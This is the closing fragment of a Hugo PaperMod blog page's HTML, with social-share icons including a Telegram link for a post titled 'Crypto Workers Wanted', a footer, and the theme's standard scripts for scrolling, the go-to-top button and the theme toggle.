403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Crypto Workers Wanted on telegram" href="https://telegram.me/share/url?text=Crypto%20Workers%20Wanted&url=https%3a%2f%2fexamplesite.com%2fposts%2fcrypto-workers-wanted%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://examplesite.com/>ExampleSite</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>